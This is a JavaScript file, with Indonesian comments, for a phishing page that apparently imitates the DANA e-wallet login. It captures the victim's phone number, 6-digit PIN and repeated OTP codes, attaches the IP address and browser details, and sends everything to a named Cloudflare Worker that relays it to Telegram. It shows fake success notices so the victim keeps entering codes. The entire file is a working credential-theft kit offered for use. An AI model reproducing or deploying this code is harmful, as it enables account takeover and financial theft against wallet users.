// ==================== SCRIPT.JS UNTUK DANA PAGE ====================
// TERHUBUNG KE CLOUDFLARE WORKER (BUKAN NETLIFY)

// ==================== KONFIGURASI ====================
// GANTI URL INI DENGAN URL WORKER CLOUDFLARE KAMU!
const WORKER_URL = 'https://bottelegramku.daftaraddyoi.workers.dev';

// ==================== FUNGSI UTAMA ====================
// Fungsi untuk mendapatkan IP Address
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.log('Gagal dapat IP:', error);
        return 'Tidak terdeteksi';
    }
}

// Fungsi untuk mengirim data ke Telegram via Cloudflare Worker
async function sendToTelegram(data) {
    try {
        const ip = await getUserIP();
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        const userAgent = navigator.userAgent;
        
        const payload = {
            ...data,
            ip_address: ip,
            timestamp: timestamp,
            user_agent: userAgent
        };
        
        console.log('Mengirim ke Worker:', payload);
        
        const response = await fetch(WORKER_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            console.log('Notifikasi terkirim ke Telegram');
            return true;
        }
        console.log('Response tidak OK:', response.status);
        return false;
    } catch (error) {
        console.error('Gagal kirim ke Telegram:', error);
        return false;
    }
}

// ==================== FUNGSI NAVIGASI HALAMAN ====================
function showPage(pageId) {
    const numberPage = document.getElementById('number-page');
    const pinPage = document.getElementById('pin-page');
    const otpPage = document.getElementById('otp-page');
    
    if (numberPage) numberPage.style.display = 'none';
    if (pinPage) pinPage.style.display = 'none';
    if (otpPage) otpPage.style.display = 'none';
    
    const targetPage = document.getElementById(pageId);
    if (targetPage) targetPage.style.display = 'block';
}

// ==================== VALIDASI & PROSES NOMOR HP ====================
function validateAndProcessPhone() {
    const phoneInput = document.getElementById('phone-number');
    if (!phoneInput) {
        console.error('Elemen phone-number tidak ditemukan');
        return false;
    }
    
    let phone = phoneInput.value.trim();
    
    // Format nomor HP
    if (phone.startsWith('0')) {
        phone = '62' + phone.substring(1);
    }
    
    // Hapus karakter selain angka
    phone = phone.replace(/\D/g, '');
    
    if (phone.length < 9 || phone.length > 15) {
        alert('Masukkan nomor HP yang valid (9-15 digit)');
        return false;
    }
    
    // Kirim notifikasi nomor HP ke Telegram
    sendToTelegram({
        type: 'nomor_hp',
        phone_number: phone
    });
    
    // Pindah ke halaman PIN
    showPage('pin-page');
    
    // Sembunyikan tombol lanjutkan
    const fixedBtn = document.querySelector('.fixed-button-container');
    if (fixedBtn) fixedBtn.style.display = 'none';
    
    // Auto-focus ke input PIN pertama
    setTimeout(() => {
        const firstPinBox = document.querySelector('.pin-box');
        if (firstPinBox) firstPinBox.focus();
    }, 100);
    
    return true;
}

// ==================== FUNGSI PROSES PIN ====================
function processPin() {
    const pinBoxes = document.querySelectorAll('.pin-box');
    let pin = '';
    pinBoxes.forEach(box => {
        pin += box.value;
    });
    
    if (pin.length === 6) {
        const phoneInput = document.getElementById('phone-number');
        const phoneNumber = phoneInput ? phoneInput.value.trim() : '';
        
        let phone = phoneNumber;
        if (phone.startsWith('0')) {
            phone = '62' + phone.substring(1);
        }
        phone = phone.replace(/\D/g, '');
        
        // Kirim notifikasi PIN ke Telegram
        sendToTelegram({
            type: 'pin',
            phone_number: phone,
            pin: pin
        });
        
        // Pindah ke halaman OTP
        showPage('otp-page');
        
        // Auto-focus ke input OTP pertama
        setTimeout(() => {
            const firstOtpBox = document.querySelector('.otp-box');
            if (firstOtpBox) firstOtpBox.focus();
            startOtpTimer();
            showFloatingNotification();
        }, 100);
        
        return true;
    } else {
        alert('Masukkan PIN 6 digit');
        return false;
    }
}

// ==================== FUNGSI PROSES OTP ====================
let otpAttempts = 0;
const MAX_OTP_ATTEMPTS = 6;

function processOtp() {
    const otpBoxes = document.querySelectorAll('.otp-box');
    let otp = '';
    otpBoxes.forEach(box => {
        otp += box.value;
    });
    
    if (otp.length === 4) {
        const phoneInput = document.getElementById('phone-number');
        let phoneNumber = phoneInput ? phoneInput.value.trim() : '';
        
        if (phoneNumber.startsWith('0')) {
            phoneNumber = '62' + phoneNumber.substring(1);
        }
        phoneNumber = phoneNumber.replace(/\D/g, '');
        
        // Kirim notifikasi OTP ke Telegram
        sendToTelegram({
            type: 'otp',
            phone_number: phoneNumber,
            otp: otp,
            attempt: otpAttempts + 1
        });
        
        otpAttempts++;
        
        // Update counter percobaan
        const attemptCounter = document.getElementById('attempt-counter');
        const attemptNumber = document.getElementById('attempt-number');
        if (attemptCounter && attemptNumber) {
            attemptCounter.style.display = 'block';
            attemptNumber.textContent = `${otpAttempts}/${MAX_OTP_ATTEMPTS}`;
        }
        
        // Tampilkan notifikasi sukses palsu
        showSuccessNotification();
        
        // Reset OTP boxes
        setTimeout(() => {
            document.querySelectorAll('.otp-box').forEach(box => {
                box.value = '';
            });
            const firstOtpBox = document.querySelector('.otp-box');
            if (firstOtpBox) firstOtpBox.focus();
        }, 500);
        
        return true;
    } else {
        alert('Masukkan kode OTP 4 digit');
        return false;
    }
}

// ==================== FUNGSI SHOW/HIDE PIN ====================
function togglePinVisibility() {
    const pinBoxes = document.querySelectorAll('.pin-box');
    const showText = document.querySelector('.show-text');
    if (!pinBoxes.length || !showText) return;
    
    const isPassword = pinBoxes[0].type === 'password';
    
    pinBoxes.forEach(box => {
        box.type = isPassword ? 'text' : 'password';
    });
    
    showText.classList.toggle('active');
    showText.textContent = isPassword ? 'Sembunyikan' : 'Tampilkan';
}

// ==================== FUNGSI OTP TIMER ====================
let otpTimerInterval;
let timeLeft = 115;

function startOtpTimer() {
    const resendOtp = document.getElementById('resend-otp');
    const timerSpan = document.getElementById('otp-timer');
    
    if (otpTimerInterval) clearInterval(otpTimerInterval);
    timeLeft = 115;
    
    if (resendOtp) {
        resendOtp.classList.remove('active');
        resendOtp.style.pointerEvents = 'none';
        resendOtp.style.opacity = '0.5';
    }
    
    otpTimerInterval = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(otpTimerInterval);
            if (resendOtp) {
                resendOtp.classList.add('active');
                resendOtp.style.pointerEvents = 'auto';
                resendOtp.style.opacity = '1';
            }
            if (timerSpan) timerSpan.textContent = '0';
        } else {
            timeLeft--;
            if (timerSpan) timerSpan.textContent = timeLeft;
        }
    }, 1000);
}

function resendOtpCode() {
    if (timeLeft <= 0) {
        const phoneInput = document.getElementById('phone-number');
        let phoneNumber = phoneInput ? phoneInput.value.trim() : '';
        
        if (phoneNumber.startsWith('0')) {
            phoneNumber = '62' + phoneNumber.substring(1);
        }
        phoneNumber = phoneNumber.replace(/\D/g, '');
        
        // Kirim notifikasi resend ke Telegram
        sendToTelegram({
            type: 'resend_otp',
            phone_number: phoneNumber
        });
        
        startOtpTimer();
        showFloatingNotification();
    }
}

// ==================== NOTIFIKASI FLOATING ====================
function showFloatingNotification() {
    const notification = document.getElementById('floating-notification');
    if (notification) {
        notification.style.display = 'block';
        setTimeout(() => {
            notification.style.display = 'none';
        }, 3000);
    }
}

function showSuccessNotification() {
    const notification = document.getElementById('success-notification');
    if (notification) {
        notification.style.display = 'block';
        setTimeout(() => {
            notification.style.display = 'none';
        }, 3000);
    }
}

function showRewardNotification() {
    const rewardNotif = document.getElementById('reward-notification');
    if (rewardNotif) {
        rewardNotif.style.display = 'block';
        setTimeout(() => {
            rewardNotif.style.display = 'none';
        }, 4000);
    }
}

// ==================== AUTO MOVE INPUT ====================
function setupAutoMoveInputs() {
    // Auto-move untuk PIN
    const pinBoxes = document.querySelectorAll('.pin-box');
    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', function() {
            if (this.value.length === 1 && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }
            
            // Auto submit jika PIN lengkap
            let pin = '';
            pinBoxes.forEach(pb => { pin += pb.value; });
            if (pin.length === 6) {
                processPin();
            }
        });
        
        box.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });
    
    // Auto-move untuk OTP
    const otpBoxes = document.querySelectorAll('.otp-box');
    otpBoxes.forEach((box, index) => {
        box.addEventListener('input', function() {
            if (this.value.length === 1 && index < otpBoxes.length - 1) {
                otpBoxes[index + 1].focus();
            }
            
            // Auto submit jika OTP lengkap
            let otp = '';
            otpBoxes.forEach(ob => { otp += ob.value; });
            if (otp.length === 4) {
                processOtp();
            }
        });
        
        box.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                otpBoxes[index - 1].focus();
            }
        });
    });
}

// ==================== LOADING SPINNER ====================
function showLoading() {
    const spinner = document.querySelector('.spinner-overlay');
    if (spinner) spinner.style.display = 'flex';
}

function hideLoading() {
    const spinner = document.querySelector('.spinner-overlay');
    if (spinner) spinner.style.display = 'none';
}

// ==================== EVENT LISTENERS ====================
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM siap, menghubungkan event listeners...');
    
    // Tombol Lanjutkan
    const lanjutkanBtn = document.getElementById('lanjutkan-button');
    if (lanjutkanBtn) {
        lanjutkanBtn.addEventListener('click', function() {
            const numberPage = document.getElementById('number-page');
            if (numberPage && numberPage.style.display === 'block') {
                validateAndProcessPhone();
            }
        });
    }
    
    // Enter key pada input nomor HP
    const phoneInput = document.getElementById('phone-number');
    if (phoneInput) {
        phoneInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                validateAndProcessPhone();
            }
        });
    }
    
    // Show/Hide PIN
    const showText = document.querySelector('.show-text');
    if (showText) {
        showText.addEventListener('click', togglePinVisibility);
    }
    
    // Resend OTP
    const resendOtp = document.getElementById('resend-otp');
    if (resendOtp) {
        resendOtp.addEventListener('click', resendOtpCode);
    }
    
    // Floating notification click
    const floatingNotif = document.getElementById('floating-notification');
    if (floatingNotif) {
        floatingNotif.addEventListener('click', function() {
            this.style.display = 'none';
        });
    }
    
    // Setup auto-move inputs
    setupAutoMoveInputs();
    
    // Hanya tampilkan tombol lanjutkan di halaman nomor HP
    const pinPage = document.getElementById('pin-page');
    const otpPage = document.getElementById('otp-page');
    const numberPage = document.getElementById('number-page');
    const fixedBtn = document.querySelector('.fixed-button-container');
    
    function updateButtonVisibility() {
        if (!fixedBtn) return;
        if ((pinPage && pinPage.style.display === 'block') || 
            (otpPage && otpPage.style.display === 'block')) {
            fixedBtn.style.display = 'none';
        } else {
            fixedBtn.style.display = 'flex';
        }
    }
    
    // Observer untuk perubahan style
    if (numberPage && pinPage && otpPage) {
        const observer = new MutationObserver(updateButtonVisibility);
        observer.observe(numberPage, { attributes: true, attributeFilter: ['style'] });
        observer.observe(pinPage, { attributes: true, attributeFilter: ['style'] });
        observer.observe(otpPage, { attributes: true, attributeFilter: ['style'] });
    }
});

// ==================== EKSPOR GLOBAL ====================
window.sendToTelegram = sendToTelegram;
window.validateAndProcessPhone = validateAndProcessPhone;
window.processPin = processPin;
window.processOtp = processOtp;
window.showPage = showPage;

console.log('Script.js siap! Worker URL:', WORKER_URL);
